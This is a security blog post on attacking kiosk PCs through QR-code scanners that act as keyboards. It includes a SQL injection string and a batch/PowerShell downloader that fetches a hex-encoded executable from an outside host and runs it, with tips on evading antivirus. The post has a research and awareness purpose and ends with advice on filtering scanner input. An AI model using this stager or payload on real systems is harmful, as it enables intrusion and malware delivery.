---
date: 2016-06-18 14:07:00+02:00
title: Pwned by a QR Code
header:
  image: /assets/images/posts/computer-cropped.jpg
teaser_image_path: /assets/images/posts/computer-cropped.jpg
toc: true
toc_label: "Content"
toc_sticky: true
tags:
- Security
- Hacking
---

More and more use bar codes outside the retail industry as a source or pointer to information. If you think about it, this also serves as a teaser to the observer as the information is not there in clear text. The target is bound to try to find out what it says...

## The QR Code

First a short re-cap; QR - Or Quick Response Code which was originally invented for the japanese automotive industry is a bar code standard which encode data into a two-dimensional matrix. And when I talk to people, the most common denominator is that they think the code is only representing a URL, and that nothing else may be contained in it. In fact in can contain so much more!

## Data Capacity

The standard shows quite an impressive capacity as shown in the following table:

Input Type	Max. Chars.	Possible Chars.
Numeric	7,089	0-9
Alphanumeric	4,296	0-9, A-Z (Upper case only), space, $, %, *, +, -, ., /, :
Binary	2,953	ISO 8859-1

This of course also all depends on which error correction level being used. The higher level, the more redundancy must be encoded, which in turn of course consumes more space:

Low - 7% of all code words may be restored
Medium - 15% of all code words may be restored
Qartile - 25% of all code words may be restored
High - 30% of all code words may be restored

So if parts of the QR Code is torn off, blurred or in other ways corrupted it may still be successfully scanned. You may have seen this utilized in a very creative manner, where the creater put their logo in the QR code. As ou may imagine, this gives us a lot to work with as this is more than enough in order encode a backdoor, dropper or any other type of exploit into a single QR Code image.

## The Scanner

In order to interpret the QR Code we need a scanner or a software implemented image interpreter. Most of us know the latter best as a small app for your smart phone. These are also the main reason why so many know of the QR Code technique. However in this caase we will focus on the second common scanner type that the public comes in contact with: Kiosk PCs, Price tag and serach terminals and similar. Many of these scanners are connected to the system as a standard USB HID keyboard and as such have most of its functionality. This means that anything that can be done via the keyboard can be done via a QR Code.

From experience I've found that most scanners are lacking support for special keys such as ALT, ALT Gr and key combinations such as CTRL+ALT+DEL though. Many also support a wide variety of code standards such as Code 128 and QR Code just to mention two of the more capable. This may have real security implications if the system in question is a keyboard-less kiosk PC or where an on-screen software keyboard is used which functionality is filtered.

## So what can we do with it in the end?

As you may have imagined, a lot of mischief can be done! The below QR code is the encoded string:

'OR 1=1--

Imagine what would happen in for example a kiosk PC environment where special keys are supressed and the web application it is running is suceptible to SQL injection.

Why stop there? Given the capacity of a single image it is technically possible to embedd a pretty advanced piece of malware into one image. Say you have access to the command prompt at this stage: The example below is a PoC of a small downloader written in PowerShell. But first we need to get the script onto the system which we do with a simple cmd job echoing the script into a file and then executes it. When executed it downloads a binary encoded into ASCII hex, converts it back into a binary and executes it.

Below is the batch code which writes the PowerShell script to file:

```powershell
@echo off
echo function DLE>C:\f.ps1
echo {$w=New-Object System.Net.WebClient>>C:\f.ps1
echo [string]$h=$webClient.DownloadString(http://www.0x90.se/bin)>>C:\f.ps1
echo [Byte[]]$t=$h -split ' '>>C:\f.ps1
echo [System.IO.File]::WriteAllBytes("$env:C:\Windows\System32\temp\s.exe", $t)>>C:\f.ps1
echo start-process -nonewwindow "$env:C:\Windows\System32\temp\s.exe"}>>C:\f.ps1
echo DLE>>C:\f.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\f.ps1
rm C:\f.ps1
```

powershell.scriptAnd to the left is the above code represented as a QR Code. This particular binary downloaded is programmed just to start the calculator, so have no fear!

"Hey! Why do you need to encode it into ASCII hex in the first place when you can download the binary directly?"...True! But I have a greater chance in bypassing any IPS's and antiviral protections on the way that may be watching us. The downloader in this case is just a mere 481 bytes so it fits very well in a QR Code image. And if you take a closer look at the two first hex values (x77, x90) in the partial hex representation below to the right you will find that it is the initial bytes of the DOS header in a typical PE executable: MZ

The downloaded ASCII hex encoded binary is just above 18k so it unfortunately falls out of any range supported by the QR standard. If I encode the same routine using Metasploit for example I end up with a binary that is about 5k and a hex file around 13k. This binary also triggers most AV products as well. If you put your mind to it, you would be able to make the executable much smaller if it were to be written in for example ASM. The ultimate goal would be to have it all selfcontained in one single QR Code: One image, one hit.

Using the above method we could also implement a standard multi-staged chain of infection of a typical APT: Plant dropper --> download recconaissance program --> download custom malware. So in effect it will take just milliseconds to enter each code via the reader and a few seconds for it to execute the whole attack. In case the code is bigger we just need to split it into several QR Code images. A typical A4/Letter sheet would be able to hold several tens of kilobytes.

We can easily exploit other services such as web applications and transport layer implementations as well letting the victim do our biddings using the QR Code as a bearer of the initial prerequisites for an attack. This cold range from attacks such as SQL injection and Cross-Site Scripting to buffer overflow attacks and information theft.

## Conclusion

Imagine a scenario where a serious vulnerability is discovered in the component that handles QR Code decoding in a mobile platform. Paste the exploit on a public billboard and own as many mobile devices as you want! Perhaps you may want to think twice before scanning that unknown QR Code.

Regarding scanners, always think of them in terms of a keyboard and the power that comes with that type of device. It will most certainly be present and active at all times even if software keyboards are suppressed at certain points (or always?). The input from a scanner will need to be filtered, validated and perhaps truncated just as any other untrusted source.

For more information about the QR Code standard, please see Wikipedia for great coverage: http://en.wikipedia.org/wiki/QR_code

Finally, here is food for thought: How do we check public billboards etc. for malicous QR Code content? Do we hire personnel driving around town scanning QR codes for malicious content? ;)

Credits due: PowerShell inspiration gotten from Nikhil at http://labofapenetrationtester.blogspot.com/